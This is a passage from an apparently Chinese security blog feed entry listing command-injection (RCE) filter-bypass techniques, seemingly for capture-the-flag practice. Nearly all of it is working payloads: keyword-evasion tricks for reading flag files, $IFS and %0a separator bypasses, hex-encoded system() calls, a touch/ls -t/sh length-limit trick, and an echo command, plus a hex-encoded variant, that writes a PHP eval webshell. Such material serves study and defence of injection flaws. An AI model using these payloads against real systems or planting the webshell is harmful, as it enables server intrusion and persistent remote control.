A|B表示A命令语句的输出，作为B命令语句的输入执行。当A为false的时候将不会执行</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">||  A||B表示A命令语句执行失败，然后才执行B命令语句</span><br></pre></td></tr></table></figure></li><li>Linux<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;       命令后面跟上一个空格和 ‘&amp;’，可执行多个语句，直到kill -s</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;      可以进行多条命令的无关联执行，每条执行结果互不影响</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;  ||     与Windows中相同</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">()      如果想执行几个命令，则需要用命令分隔符分号隔开每个命令，并使用圆括号()把所有命令组合起来</span><br></pre></td></tr></table></figure></li></ul><h2 id="命令绕过"><a href="#命令绕过" class="headerlink" title="命令绕过"></a>命令绕过</h2><h3 id="过滤cat-flag等关键词"><a href="#过滤cat-flag等关键词" class="headerlink" title="过滤cat,flag等关键词"></a>过滤cat,flag等关键词</h3><ol><li><p>代替</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，可以查看</span><br><span class="line">vim:一种编辑器，可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">sh /flag 2&gt;%261  //报错出文件内容</span><br></pre></td></tr></table></figure></li><li><p>使用转义符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ca\t /fl\ag</span><br><span class="line">cat fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure></li><li><p>内联执行绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=fl;b=ag.php;cat$IFS$a$b</span><br></pre></td></tr></table></figure></li><li><p>变量绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=c;b=a;c=t;$a$b$c 1.txt</span><br></pre></td></tr></table></figure></li><li><p>编码进制绕过<br>16进制&amp;base64编码</p></li><li><p>利用正则匹配绕过<br>例：<br>过滤&#x2F;1010&#x2F;flag.php文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 1010/flag.php</span><br><span class="line">cat ????/fla*</span><br></pre></td></tr></table></figure></li><li><p>利用未初始化变量，使用$u绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 1010/flag.php</span><br><span class="line">cat 1010$u/flag.php</span><br></pre></td></tr></table></figure></li></ol><ul><li>命令执行函数system()绕过<br>system(“whoami”)</li></ul><ol><li>十六进制<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">“\x73\x79\x73\x74\x65\x6d”(“whoami”);</span><br></pre></td></tr></table></figure></li><li>括号绕过<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(sy.(st).em)(whoami);</span><br></pre></td></tr></table></figure></li><li>使用内敛执行代替system<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo `ls`;</span><br><span class="line">echo $(ls);</span><br><span class="line">?&gt;&lt;?=`ls`;</span><br><span class="line">?&gt;&lt;?=$(ls);</span><br></pre></td></tr></table></figure></li></ol><ul><li>使用∗ 和 *和∗和@，x , x,x,{数字}<br>因为在没有传参的情况下，上面的特殊变量都是为空的<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ca$*t 1010/flag.php</span><br><span class="line">ca$@t 1010/flag.php</span><br><span class="line">ca$2t 1010/flag.php</span><br><span class="line">ca$&#123;39&#125;t 1010/flag.php</span><br></pre></td></tr></table></figure></li><li><pre><code>其它文件读取方式</code></pre><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl file:///root/1010/flag.php</span><br><span class="line">strings 1010/flag.php</span><br><span class="line">uniq -c 1010/flag.php</span><br><span class="line">bash -v 1010/flag.php</span><br><span class="line">rev 1010/flag.php</span><br></pre></td></tr></table></figure></li><li>dir与ls的代替<br>find 列出当前目录下的文件以及子目录所有文件</li></ul><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%09（url传递）(cat%09flag.php)</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&lt;&gt;（cat&lt;&gt;/flag）</span><br><span class="line">&lt;（cat&lt;/flag）</span><br><span class="line">&#123;cat,flag&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符 (&#x2F;)"></a>过滤目录分隔符 (&#x2F;)</h3><p>采用多个管道命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;cd flag;cat *</span><br></pre></td></tr></table></figure><h3 id="过滤分隔符"><a href="#过滤分隔符" class="headerlink" title="过滤分隔符 | &amp; ;"></a>过滤分隔符 | &amp; ;</h3><p>可以使用%0a代替，%0a其实在某种程度上是最标准的命令链接符号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">功能                       符号                         payload</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">换行符                       %0a                        ?cmd=123%0als</span><br><span class="line">回车符                       %0d                        ?cmd=123%0dls</span><br><span class="line">连续指令                ;                                ?1=123;pwd</span><br><span class="line">后台进程                &amp;                                ?1=123&amp;pwd</span><br><span class="line">管道                          |                                  ?1=123|pwd</span><br><span class="line">逻辑运算              ||或&amp;&amp;                        ?1=123&amp;&amp;pwd</span><br></pre></td></tr></table></figure><h3 id="代替"><a href="#代替" class="headerlink" title="?&gt;代替;"></a>?&gt;代替;</h3><p>在php中可以用?&gt;来代替最后一个;因为php遇到定界符关闭标志时，系统会自动在PHP语句之后加上一个分号。</p><h3 id="字符串长度受限"><a href="#字符串长度受限" class="headerlink" title="字符串长度受限"></a>字符串长度受限</h3><p>使用touch来生成文件，然后将生成的文件名拼凑成一句命令，最后执行，达到目的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;-- cat flag.php --&gt;</span><br><span class="line">替换：</span><br><span class="line">touch &quot;hp&quot;</span><br><span class="line">touch &quot;g.p\\&quot;</span><br><span class="line">touch &quot;la\\&quot;</span><br><span class="line">touch &quot;t f\\&quot;</span><br><span class="line">touch &quot;ca\\&quot;</span><br><span class="line">ls -t</span><br><span class="line">ls -t &gt;a 将 ls -t 内容写入到a文件中</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\是指换行</span><br><span class="line">ls -t将文件按时间排序输出</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><ul><li>shell_exec等无回显函数<br>判断：<code>ls;sleep(3)</code><br>利用：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//复制，压缩，写shell等方法</span><br><span class="line">copy flag.php flag.txt</span><br><span class="line">mv flag.php flag.txt</span><br><span class="line">cat flag.php &gt; flag.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//压缩方法</span><br><span class="line">tar cvf flag.tar flag.php #tar压缩</span><br><span class="line">tar zcvf flag.tar.gz flag.php  #tar解压</span><br><span class="line">zip flag.zip flag.php  #zip压缩</span><br><span class="line">unzip flag.zip  #zip解压</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 写shell方法【echo &quot;&lt;?php @eval(\$_POST[123]); ?&gt;&quot; &gt; webshell.php】</span><br><span class="line">// 3c3f706870206576616c28245f504f53545b3132335d293b203f3e是&lt;?php eval($_POST[123]); ?&gt;的十六进制编码</span><br><span class="line">echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php</span><br></pre></td></tr></table></figure></li></ul>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;blockquote&gt;
-&lt;p&gt;参考文章：&lt;br&gt;&lt;a href=&quot;https://blog.csdn.net/qq_63844103/article/details/126953630&quot;&gt;【web安全】——命令执行漏洞（RCE）详解&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https:</summary>
       
     
     
